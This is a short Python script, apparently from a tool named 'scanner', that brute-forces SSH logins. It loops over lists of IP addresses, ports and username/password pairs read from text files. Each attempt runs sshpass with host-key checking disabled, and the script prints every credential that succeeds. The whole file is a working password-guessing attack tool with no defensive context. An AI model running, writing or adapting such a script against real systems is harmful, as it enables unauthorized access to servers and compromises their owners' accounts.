from scanner.looper import looper, cnx
from scanner.looper import format
from scanner.shell import shell

DEBUG = False
__user_password = looper("passwords.txt", True).loop()
if DEBUG:
    print(__user_password)
__ips = looper("ips.txt").loop()
if DEBUG:
    print(__ips)
__protocols = looper("protocols.txt", True).loop()
if DEBUG:
    print(__protocols)

for ip in __ips:
    for pr in __protocols:
        for u in __user_password:
            prep = "sshpass -p {} ssh -q -o ConnectTimeout=1 -o StrictHostKeyChecking=no {}@{} -p {} 'exit'".format(
                u[1].rstrip(), u[0].rstrip(), ip.rstrip(), pr[0].rstrip())
            r = shell().execom(prep)
            if r["retcode"] == 255 or r["retcode"] == 4:
                break
            elif r["retcode"] == 0:
                print(format(ip, pr[0], u[0], u[1]).format())
                # out
                break
